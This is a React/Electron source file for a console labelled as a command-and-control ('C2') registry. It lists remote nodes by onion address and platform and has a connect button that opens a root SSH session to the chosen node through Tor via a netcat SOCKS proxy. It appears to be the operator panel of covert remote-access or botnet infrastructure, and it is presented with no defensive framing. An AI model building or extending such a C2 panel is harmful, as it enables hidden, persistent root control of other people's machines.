import React, { useState, useEffect } from 'react';
import styled, { keyframes } from 'styled-components';
import { HardDrive, RefreshCw, Link, Smartphone, AlertTriangle } from 'lucide-react';

const slideIn = keyframes`
    from { opacity: 0; transform: translateX(-20px); }
    to { opacity: 1; transform: translateX(0); }
`;

const Root = styled.div`
    padding: 30px;
    color: ${props => props.theme.colors.text};
    height: 100%;
    display: flex;
    flex-direction: column;
    gap: 30px;
`;

const Header = styled.div`
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid ${props => props.theme.colors.border};
    padding-bottom: 20px;
`;

const Title = styled.h2`
    margin: 0;
    letter-spacing: 3px;
    text-transform: uppercase;
    font-size: 1.1rem;
    font-weight: 800;
    color: ${props => props.theme.colors.primary};
`;

const RefreshButton = styled.button`
    background: transparent;
    border: 1px solid ${props => props.theme.colors.primary};
    color: ${props => props.theme.colors.primary};
    padding: 12px 25px;
    border-radius: 12px;
    cursor: pointer;
    font-size: 0.8rem;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 2px;
    display: flex;
    align-items: center;
    gap: 10px;
    transition: 0.3s;
    min-height: 50px;

    &:hover {
        background: ${props => props.theme.colors.primary}11;
        box-shadow: 0 0 10px ${props => props.theme.colors.glow};
    }
`;

const ErrorMsg = styled.div`
    background: ${props => props.theme.colors.error}11;
    color: ${props => props.theme.colors.error};
    border: 1px solid ${props => props.theme.colors.error}44;
    padding: 20px;
    border-radius: 15px;
    font-weight: 700;
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 0.8rem;
    text-transform: uppercase;
`;

const TableContainer = styled.div`
    flex: 1;
    overflow-y: auto;
    ${props => props.theme.effects.glass}
    background: ${props => props.theme.colors.glass};
    border-radius: 25px;
    padding: 15px;
    -webkit-overflow-scrolling: touch;
`;

const StyledTable = styled.table`
    width: 100%;
    border-collapse: separate;
    border-spacing: 0 10px;
`;

const Th = styled.th`
    text-align: left;
    padding: 15px 25px;
    font-size: 0.7rem;
    text-transform: uppercase;
    color: ${props => props.theme.colors.textSecondary};
    letter-spacing: 2px;
    font-weight: 800;
`;

const Td = styled.td`
    padding: 22px 25px;
    background: #fff;
    font-size: 0.95rem;
    font-weight: 600;
    transition: 0.3s;

    &:first-child { border-radius: 15px 0 0 15px; border-left: 1px solid ${props => props.theme.colors.border}44; }
    &:last-child { border-radius: 0 15px 15px 0; border-right: 1px solid ${props => props.theme.colors.border}44; }
`;

const Tr = styled.tr`
    animation: ${slideIn} 0.4s ease-out backwards;
    animation-delay: ${props => props.index * 0.04}s;
    &:hover ${Td} {
        background: #F8FAFC;
    }
`;

const ConnectButton = styled.button`
    background: ${props => props.theme.colors.primary};
    color: #fff;
    border: none;
    padding: 12px 20px;
    border-radius: 10px;
    font-size: 0.75rem;
    font-weight: 800;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 1px;
    transition: 0.3s;
    min-height: 45px;

    &:hover {
        background: #0088CC;
        box-shadow: 0 5px 15px rgba(0, 170, 255, 0.3);
    }
`;

const ipcRenderer = (typeof window !== 'undefined' && window.electronAPI)
    ? window.electronAPI.ipcRenderer
    : { invoke: async () => [] };

const MasterConsole = () => {
    const [instances, setInstances] = useState([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const fetchRegistry = async () => {
        setLoading(true);
        setError('');
        try {
            const result = await ipcRenderer.invoke('ai.command', 'internal.c2_list');
            const data = JSON.parse(result);
            if (Array.isArray(data)) {
                setInstances(data);
            } else {
                setError('FAILED TO PARSE C2 DATA');
            }
        } catch (err) {
            setError('C2 REGISTRY OFFLINE OR UNREACHABLE');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchRegistry();
    }, []);

    const connectToInstance = (onion) => {
        const cmd = `ssh -o "ProxyCommand=nc -X 5 -x 127.0.0.1:9050 %h %p" root@${onion}`;
        ipcRenderer.send('terminal.keystroke', `${cmd}\r`);
        // Visual confirmation could be better than alert
    };

    return (
        <Root>
            <Header>
                <Title>GLOBAL INSTANCE REGISTRY [C2]</Title>
                <RefreshButton onClick={fetchRegistry}>
                    <RefreshCw size={18} className={loading ? 'spin' : ''} />
                    REFRESH_NODES
                </RefreshButton>
            </Header>

            {error && (
                <ErrorMsg>
                    <AlertTriangle size={20} />
                    {error}
                </ErrorMsg>
            )}

            <TableContainer>
                <StyledTable>
                    <thead>
                        <tr>
                            <Th>INSTANCE_ID</Th>
                            <Th>ONION_UPLINK</Th>
                            <Th>PLATFORM</Th>
                            <Th>LAST_SEEN</Th>
                            <Th>ACTIONS</Th>
                        </tr>
                    </thead>
                    <tbody>
                        {instances.map((node, i) => (
                            <Tr key={node.id} index={i}>
                                <Td style={{ color: '#34495E', fontFamily: 'monospace' }}>{node.id.slice(0, 12)}...</Td>
                                <Td style={{ color: '#00AAFF', fontSize: '0.85rem' }}>{node.onion}</Td>
                                <Td>
                                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                        <Smartphone size={14} style={{ opacity: 0.5 }} />
                                        {node.metadata?.platform || 'UNKNOWN'}
                                    </div>
                                </Td>
                                <Td style={{ color: '#7F8C8D', fontSize: '0.8rem' }}>{new Date(node.last_seen).toLocaleTimeString()}</Td>
                                <Td>
                                    <ConnectButton onClick={() => connectToInstance(node.onion)}>
                                        <Link size={14} style={{ marginRight: '8px' }} />
                                        CONNECT
                                    </ConnectButton>
                                </Td>
                            </Tr>
                        ))}
                        {instances.length === 0 && !loading && (
                            <tr>
                                <Td colSpan="5" style={{ textAlign: 'center', padding: '80px', opacity: 0.3 }}>
                                    <HardDrive size={40} style={{ marginBottom: '15px' }} /><br />
                                    NO ACTIVE NODES DETECTED IN GRID.
                                </Td>
                            </tr>
                        )}
                    </tbody>
                </StyledTable>
            </TableContainer>
        </Root>
    );
};

export default MasterConsole;
